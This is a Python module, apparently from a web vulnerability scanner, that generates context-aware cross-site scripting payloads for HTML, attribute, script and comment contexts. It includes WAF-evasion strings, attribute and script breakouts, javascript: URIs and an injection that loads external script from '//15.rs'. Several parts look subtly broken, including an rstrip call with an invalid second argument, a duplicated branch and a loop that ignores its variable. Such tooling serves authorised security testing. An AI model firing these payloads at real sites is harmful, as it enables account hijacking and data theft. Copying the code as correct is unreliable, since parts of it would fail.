"""Adaptive payload generation for XSS testing.

Generates context-aware XSS payloads based on the detected HTML context.
Each context (html, attribute, script, comment) gets a tailored set of
payloads designed specifically for that execution environment.

Inspired by XSStrike's generator.py: instead of spraying every payload
everywhere, we generate only the payloads that have a chance of working
in each specific context.

Usage::

    gen = PayloadGenerator(contexts)
    payloads = gen.generate()  # dict[confidence_level] -> list[str]
"""

from __future__ import annotations

import secrets as random
from collections.abc import Sequence
from dataclasses import dataclass

from src.analysis.active.injection._context_detector import (
    ContextType,
    ReflectionContext,
)


@dataclass
class PayloadEntry:
    """A single generated payload."""

    vector: str
    confidence: int  # 1-10 scale; higher = more likely to work
    context: ContextType
    description: str


# --- Filler sequences (XSStrike fillings pattern) ---
# Used between HTML tag elements instead of spaces
SPACE_SUBSTITUTES = ("%09", "%0a", "%0d", "/+/")

# Used between event handler and = sign
EQUALITY_FILLERS = ("%09", "%0a", "%0d", "%20", "+")

# Used before closing >
CLOSE_FILLERS = ("", "%0dx", "%09", "%0a")

# Used inside JavaScript between tokens
JS_FILLINGS = (";", "%0a", "%20")

# --- Tags compatible with event handlers (XSStrike tags pattern) ---
EVENT_HANDLERS = {
    "ontoggle": ["details"],
    "onpointerenter": ["details", "html", "d3v", "a"],
    "onfocus": ["input", "select", "textarea", "button"],
    "onmouseover": ["a", "html", "d3v", "details"],
    "onanimationstart": ["d3v", "html", "a"],
}

HTML_TAGS = ("html", "d3v", "a", "details", "body", "div")

# JavaScript alert/confirm/prompt bypass functions
JS_FUNCTIONS = (
    "confirm()",
    "prompt(1)",
    "alert(1)",
    "[8].find(confirm)",
    "(confirm)()",
    "co\\u006efir\\u006d()",
    "(prompt)``",
)

# WAF evasion payloads
EVADE_PAYLOADS = (
    # Case randomization
    "<ImG/SrC=x%20oNeRrOr=confirm()>",
    "<SwAG/OnLoAd=(confirm)()>",
    # Character encoding bypasses
    "<svg%0Aonload=%09((pro\\u006dpt))()//",
    "<iMg sRc=x:confi\\u0072m`` oNlOad=e\\u0076al(src)>",
    # HTML entity encoding
    "<svg/onload=co&#110;firm&#40;1&#41;>",
    "<img src=x onerror=confir\\u006d`1`>",
    # Tag name bypasses
    "<d3v/OnPointErEnter=confirm(1)//",
    "<details OnTogGle=conf\\u0069rm`` open>",
    # Script context breakers
    "</script/>",
    "</script></script>",
    "-->",
)

# Special attribute-specific payloads
ATTRIBUTE_PAYLOADS = {
    "srcdoc": lambda q: (
        f"{q}//srcdoc=%26lt;svg/on%26%23x6c%26%23oad%26%23x3d%26%23x63%26%23onfirm%281%28%26gt;//"
    ),
    "href": lambda q: f"{q}//javascript:confirm(1)//",
    "src": lambda q: "//15.rs",
    "action": lambda q: f"{q}//javascript:confirm(1)//",
    "data": lambda q: "javascript:confirm(1)",
}

# Event handler payload templates
EVENT_TEMPLATE = "{fill}{tag}{fill}{handler}{eq_fill}={eq_fill}{fn}{close}"

# Context-specific tag closers
TAG_CLOSERS = {
    "script": ["</script>"],
    "comment": ["-->"],
}


def random_upper(s: str) -> str:
    """Randomly uppercase characters in a string for case evasion."""
    return "".join(random.choice((c.upper(), c.lower())) for c in s)


class PayloadGenerator:
    """Generates context-aware XSS payloads."""

    def __init__(
        self,
        contexts: Sequence[ReflectionContext],
        *,
        include_evasion: bool = True,
    ) -> None:
        self._contexts = contexts
        self._include_evasion = include_evasion

    def generate(self) -> dict[int, list[PayloadEntry]]:
        """Generate payloads scored by confidence (1-10)."""
        vectors: dict[int, list[PayloadEntry]] = {i: [] for i in range(1, 11)}

        for ctx in self._contexts:
            if ctx.context == "dead":
                continue

            if ctx.context == "html":
                self._html_vectors(vectors, ctx)
            elif ctx.context == "attribute":
                self._attribute_vectors(vectors, ctx)
            elif ctx.context == "script":
                self._script_vectors(vectors, ctx)
            elif ctx.context == "comment":
                self._comment_vectors(vectors, ctx)
            elif ctx.context == "html":
                self._html_vectors(vectors, ctx)

        # Add generic evasion payloads at lower confidence
        if self._include_evasion:
            for payload in EVADE_PAYLOADS:
                vectors[3].append(
                    PayloadEntry(
                        vector=payload,
                        confidence=3,
                        context="html",
                        description="Generic WAF evasion payload",
                    )
                )

        # Remove empty levels
        vectors = {k: v for k, v in vectors.items() if v}
        return vectors

    def _html_vectors(
        self,
        vectors: dict[int, list[PayloadEntry]],
        ctx: ReflectionContext,
    ) -> None:
        """Generate vectors for HTML text context."""
        # Can inject new tags directly
        for tag in HTML_TAGS:
            ru_tag = random_upper(tag)
            for handler_info in EVENT_HANDLERS.items():
                handler_name, compatible_tags = handler_info
                if tag in compatible_tags or tag == "d3v" or tag == "html":
                    for fn in JS_FUNCTIONS:
                        vector = f"<{ru_tag}%20{random_upper(handler_name)}%3D{fn}>"
                        vectors[8].append(
                            PayloadEntry(
                                vector=vector,
                                confidence=8,
                                context="html",
                                description=f"Direct tag injection via <{tag} {handler_name}>",
                            )
                        )

        # Tag-less event handler on existing elements
        for handler_name in ["onpointerenter", "onfocus", "ontoggle", "onmouseover"]:
            for fn in JS_FUNCTIONS[:2]:
                vector = f'" {handler_name}={fn}//'
                vectors[7].append(
                    PayloadEntry(
                        vector=vector,
                        confidence=7,
                        context="html",
                        description="Attribute-level event handler injection",
                    )
                )

    def _attribute_vectors(
        self,
        vectors: dict[int, list[PayloadEntry]],
        ctx: ReflectionContext,
    ) -> None:
        """Generate vectors for HTML attribute context."""
        tag = ctx.tag or "unknown"
        attr_name = ctx.attribute_name or ""
        quote = ctx.quote_style or ""
        attr_value = ctx.attribute_value_before_marker or ""

        quote_efficiency = 90 if quote in ("'", '"') else 100 if quote == "" else 100

        # Check if attribute is srcdoc (special case: accepts HTML entities)
        if attr_name == "srcdoc":
            vector = '"//srcdoc=%26lt;img src=x onerror=confirm(1)%26gt;//'
            vectors[9].append(
                PayloadEntry(
                    vector=vector,
                    confidence=9,
                    context="attribute",
                    description="srcdoc attribute HTML entity injection",
                )
            )
            return

        # Check if attribute is href with our marker as the value
        if attr_name == "href" and attr_value == "v3dm0s":
            for fn in JS_FUNCTIONS:
                vector = f"v3dm0s{random_upper('javascript:')}confirm(1)"
                vectors[9].append(
                    PayloadEntry(
                        vector=vector,
                        confidence=9,
                        context="attribute",
                        description="javascript: URI in href attribute",
                    )
                )
            return

        # Check if attribute is an event handler (on* attribute)
        if attr_name.startswith("on"):
            closer = _find_js_closer(attr_value or "")
            for filling in JS_FILLINGS:
                for fn in JS_FUNCTIONS:
                    vector = f"{quote}{closer}{filling}{fn})//"
                    vectors[9].append(
                        PayloadEntry(
                            vector=vector,
                            confidence=9,
                            context="attribute",
                            description=f"Event handler value escape with closer '{closer}'",
                        )
                    )
            return

        # General attribute context: try to break out
        if quote_efficiency >= 90:
            # Break out of attribute and inject a tag
            for tag in ["d3v", "a", "details"]:
                ru_tag = random_upper(tag)
                for handler_name in ["onpointerenter", "ontoggle", "onmouseover"]:
                    for fn in JS_FUNCTIONS:
                        for close in [">", "//"]:
                            vector = f"{quote}/{close}<{ru_tag}%20{handler_name}={fn}>{close}"
                            vectors[7].append(
                                PayloadEntry(
                                    vector=vector,
                                    confidence=7,
                                    context="attribute",
                                    description=f"Attribute breakout to <{tag}> tag",
                                )
                            )

            # Autofocus + onfocus combo
            for filling in SPACE_SUBSTITUTES:
                for fn in JS_FUNCTIONS:
                    vector = f"{quote}{filling}{random_upper('autofocus')}{filling}{random_upper('onfocus')}={quote}{fn}"
                    vectors[8].append(
                        PayloadEntry(
                            vector=vector,
                            confidence=8,
                            context="attribute",
                            description="Attribute breakout with autofocus/onfocus",
                        )
                    )

        # Quote bypass (single char injection when quote is 90)
        if quote and 83 <= quote_efficiency < 90:
            for filling in JS_FILLINGS:
                for fn in JS_FUNCTIONS:
                    vector = f"\\{quote}{filling}{fn})//"
                    vectors[6].append(
                        PayloadEntry(
                            vector=vector,
                            confidence=6,
                            context="attribute",
                            description="Quote bypass via backslash escape",
                        )
                    )

    def _script_vectors(
        self,
        vectors: dict[int, list[PayloadEntry]],
        ctx: ReflectionContext,
    ) -> None:
        """Generate vectors for <script> context."""
        quote = ctx.quote_style or ""

        # Try to close the script tag entirely
        vector = "<Script x>prompt()</scRiPt x>"
        vectors[10].append(
            PayloadEntry(
                vector=vector,
                confidence=10,
                context="script",
                description="Full </script> tag breaker",
            )
        )

        # Script source injection
        vectors[8].append(
            PayloadEntry(
                vector="<sCriPt sRc=//15.rs>",
                confidence=8,
                context="script",
                description="External script source injection",
            )
        )

        # Inline JS context: break out of string and inject
        closer = _find_js_closer(ctx.attribute_value_before_marker or "")
        for filling in JS_FILLINGS:
            for fn in JS_FUNCTIONS:
                suffix = "//"
                if quote:
                    prefix = f"{quote}{closer}{filling}"
                else:
                    prefix = closer
                vector = f"{prefix}{fn}{suffix}"
                vectors[7].append(
                    PayloadEntry(
                        vector=vector,
                        confidence=7,
                        context="script",
                        description=f"JS context breakout (quote='{quote}', closer='{closer}')",
                    )
                )

        # Backslash quote evasion
        if quote:
            for filling in JS_FILLINGS:
                for fn in JS_FUNCTIONS:
                    func = f"({fn})" if "=" in fn else fn
                    vector = f"\\{quote}{closer}{filling}{func}//"
                    vectors[6].append(
                        PayloadEntry(
                            vector=vector,
                            confidence=6,
                            context="script",
                            description="Backslash quote evasion in script context",
                        )
                    )

    def _comment_vectors(
        self,
        vectors: dict[int, list[PayloadEntry]],
        ctx: ReflectionContext,
    ) -> None:
        """Generate vectors for HTML comment context."""
        # Close comment, then inject
        for tag in ["d3v", "details", "html", "a"]:
            ru_tag = random_upper(tag)
            for handler_name in ["onpointerenter", "ontoggle", "onmouseover"]:
                for fn in JS_FUNCTIONS:
                    vector = f"--><{ru_tag}%20{handler_name}={fn}//>"
                    vectors[7].append(
                        PayloadEntry(
                            vector=vector,
                            confidence=7,
                            context="comment",
                            description=f"Comment closure then <{tag}> injection",
                        )
                    )

        # Simple comment close with SVG
        vectors[6].append(
            PayloadEntry(
                vector="--><svg/onload=confirm(1)>",
                confidence=6,
                context="comment",
                description="Comment close with SVG onload",
            )
        )


def _find_js_closer(pre: str) -> str:
    """Find what characters need to close open JS structures before injection."""
    pre_stripped = ""
    i = 0
    while i < len(pre):
        c = pre[i]
        if c in ('"', "'", "`"):
            # Skip to end of this string
            end = pre.index(c, i + 1) if c in pre[i + 1 :] else len(pre)
            i = end + 1
            continue
        elif c == "/" and i + 1 < len(pre) and pre[i + 1] == "*":
            # Skip to end of block comment
            end = pre.index("*/", i + 2) if "*/" in pre[i + 2 :] else len(pre)
            i = end + 2
            continue
        pre_stripped += c
        i += 1

    breaker = ""
    for char in pre_stripped:
        if char == "{":
            breaker += "}"
        elif char == "(":
            breaker += ";)"
        elif char == "[":
            breaker += "]"
        elif char == "}":
            breaker = breaker.rstrip("}", 1)
        elif char == ")":
            breaker = breaker.rstrip(")", 1)
        elif char == "]":
            breaker = breaker.rstrip("]", 1)

    return breaker[::-1]
